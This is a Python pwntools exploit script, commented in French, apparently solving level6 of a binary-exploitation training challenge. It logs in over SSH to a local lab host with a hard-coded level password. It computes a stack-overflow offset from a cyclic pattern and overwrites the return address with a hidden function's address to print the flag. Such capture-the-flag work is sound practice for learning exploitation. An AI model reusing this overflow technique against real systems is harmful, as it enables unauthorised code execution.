#!/usr/bin/env python3
from pwn import *
import base64
import os

from pwnlib.adb import shell

# Configuration
context.arch = 'i386'  # Architecture du binaire (32-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = False  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8881  # Port pour SSH
USER = "level6"  # Nom d'utilisateur SSH
PASSWORD = "f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d"  # Mot de passe SSH
SSH_SESSION = None


def find_buffer_offset(pattern_size=100):
    """
    Détermine la taille d'écrasement nécessaire en utilisant un motif cyclique.
    Retourne l'offset en octets ou None si le calcul échoue.
    """
    if not LOCAL:
        log.error("Le calcul automatique de l'offset nécessite un accès local.")
        return None

    log.info("Calcul de l'offset via un motif cyclique...")
    pattern = cyclic(pattern_size)
    argv = ['./Resources/' + USER, pattern.decode('latin-1')]
    proc = get_connection(argv=argv)
    try:
        proc.wait()
    finally:
        if proc.poll() == 0:
            log.error("Le binaire n'a pas crashé, impossible de calculer l'offset.")
            proc.close()
            return None

        try:
            core = proc.corefile
        except FileNotFoundError:
            log.error("Aucun core dump disponible. Vérifiez `ulimit -c unlimited`.")
            proc.close()
            return None

        crash_addr = core.eip if context.bits == 32 else core.rip
        log.info(f"Crash address: {crash_addr}")
        offset = cyclic_find(crash_addr)

        if offset == -1:
            log.error("Impossible de retrouver l'offset dans le motif cyclique.")
            proc.close()
            return None

        log.success(f"Offset trouvé : {offset} octets")
        proc.close()
        return offset


def get_connection(custom_env=None, argv=None):
    global SSH_SESSION
    # Fonction helper pour fusionner les environnements
    def merge_env(base_env, custom_env):
        if custom_env:
            base_env.update(custom_env)
        return base_env

    if LOCAL:
        # En local, on utilise l'environnement actuel comme base
        SSH_SESSION = None
        local_env = os.environ.copy()
        final_env = merge_env(local_env, custom_env)
        final_argv = argv if argv is not None else ['./Resources/' + USER]
        return process(final_argv, env=final_env)
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        SSH_SESSION = shell
        # Récupérer l'environnement distant
        remote_env = shell.run('env').recvall().decode().strip()
        # Convertir l'output en dictionnaire
        remote_env_dict = dict(line.split('=', 1) for line in remote_env.split('\n') if '=' in line)

        # Fusionner avec nos variables personnalisées 
        final_env = merge_env(remote_env_dict, custom_env)
        final_argv = argv if argv is not None else ['/home/user/' + USER + '/' + USER]
        log.info(f"Final argv: {final_argv}")
        return shell.process(final_argv, env=final_env)


def find_function_address(function_name):
    elf = ELF('./Resources/' + USER)
    return elf.symbols[function_name]

def exploit():

    if not LOCAL:
        offset = 72
    else:
        offset = find_buffer_offset()
        if offset is None:
            log.error("Offset introuvable, abandon.")
            return

    

    if LOCAL:
        target_function = find_function_address("n")
    else:
        target_function = 0x08048454
    log.info(f"Target function address: {target_function}")


    payload = b"A" * offset + p32(target_function)
    log.info(f"Payload: {payload}")

    # Le chemin du binaire doit être une string, pas bytes
    # shell.process() attend [programme, arg1, arg2, ...]
    if not LOCAL:
        binary_path = f"/home/user/{USER}/{USER}"
        payload_arg = [binary_path, payload]
    else:
        binary_path = f"./Resources/{USER}"
        payload_arg = [binary_path, payload]

    conn = get_connection(argv=payload_arg)

    flag = conn.recvline()
    print("\n=== Flag ===")
    print(flag.decode())
    
if __name__ == "__main__":
    exploit()
